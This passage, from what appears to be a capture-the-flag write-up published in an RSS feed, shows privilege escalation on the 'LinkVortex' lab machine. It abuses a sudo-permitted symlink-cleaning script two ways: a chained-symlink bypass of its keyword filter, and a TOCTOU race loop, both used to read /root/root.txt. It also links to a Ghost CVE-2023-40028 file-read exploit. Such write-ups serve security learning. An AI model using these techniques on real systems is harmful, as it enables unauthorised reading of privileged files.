&lt;/h3>&lt;p>We create two symlinks, link1.png to link2.png and link2.png points to /root/root.txt.&lt;br>
This way, link1 bypasses the keyword check since its target doesn&amp;rsquo;t contain &lt;code>(etc|root)&lt;/code>.&lt;/p>
&lt;p>/home/bob/link1.png -&amp;gt; /home/bob/link2.png -&amp;gt; root.txt&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="hl">&lt;span class="lnt">7
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">export&lt;/span> &lt;span class="nx">CHECK_CONTENT&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="kc">true&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ln&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">link2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ln&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">PWD&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">link2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span> &lt;span class="nx">link1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">clean_symlink&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">link1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Link&lt;/span> &lt;span class="nx">found&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="nx">link1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="nx">moving&lt;/span> &lt;span class="nx">it&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">quarantine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Content&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">6&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">3&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h3 id="method-2-toctou-race-condition">Method 2: TOCTOU race condition
&lt;/h3>&lt;p>The script checks if the file is a symlink using &lt;code>/usr/bin/test -L link.png&lt;/code>. Then, it calls &lt;code>basename&lt;/code> and &lt;code>readlink&lt;/code> based on that assumption.&lt;br>
Between the check and the read of the symlink, we can exploit a race condition by continuously interchange the symlink target &lt;code>/tmp/random&lt;/code> to &lt;code>/root/root.txt&lt;/code>.&lt;/p>
&lt;p>In one terminal, we run a loop that flips the symlink target.&lt;br>
In another terminal, we repeatedly execute the vulnerable script.&lt;/p>
&lt;p>If the timing is right, the script displays the content of &lt;code>root.txt&lt;/code>.&lt;br>
This vulnerability is called TOCTOU (Time-of-Check to Time-of-use).&lt;br>
Using this &lt;a class="link" href="https://brandon-t-elliott.github.io/tic-tac" target="_blank" rel="noopener"
>article&lt;/a>, we can try to access &lt;code>root.txt&lt;/code>.&lt;/p>
&lt;p>Terminal 1
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">timeout&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">while&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">do&lt;/span> &lt;span class="nx">ln&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">sf&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">PWD&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">random&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">PWD&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">ln&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">sf&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="nx">PWD&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">done&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ln&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">failed&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">create&lt;/span> &lt;span class="nx">symbolic&lt;/span> &lt;span class="nx">link&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bob&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">File&lt;/span> &lt;span class="nx">exists&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ln&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">failed&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">create&lt;/span> &lt;span class="nx">symbolic&lt;/span> &lt;span class="nx">link&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bob&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">File&lt;/span> &lt;span class="nx">exists&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>Terminal 2
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
&lt;/span>&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bob&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">linkvortex&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">timeout&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">while&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">do&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">ghost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">clean_symlink&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">done&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Link&lt;/span> &lt;span class="nx">found&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="nx">moving&lt;/span> &lt;span class="nx">it&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">quarantine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Content&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">6&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">!&lt;/span> &lt;span class="nx">Trying&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">read&lt;/span> &lt;span class="nx">critical&lt;/span> &lt;span class="nx">files&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">removing&lt;/span> &lt;span class="nx">link&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">!&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Link&lt;/span> &lt;span class="nx">found&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="nx">link&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">png&lt;/span> &lt;span class="p">]&lt;/span> &lt;span class="p">,&lt;/span> &lt;span class="nx">moving&lt;/span> &lt;span class="nx">it&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">quarantine&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Content&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">6&lt;/span>&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;span class="mi">3&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="resources">Resources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028" target="_blank" rel="noopener"
>CVE-2023-40028 exploit&lt;/a>&lt;br>
&lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a>&lt;br>
&lt;a class="link" href="https://brandon-t-elliott.github.io/tic-tac" target="_blank" rel="noopener"
>CTF Writeup: picoCTF 2023 - &amp;ldquo;Tic-Tac&amp;rdquo;&lt;/a>&lt;/p>&lt;/blockquote></description></item></channel></rss>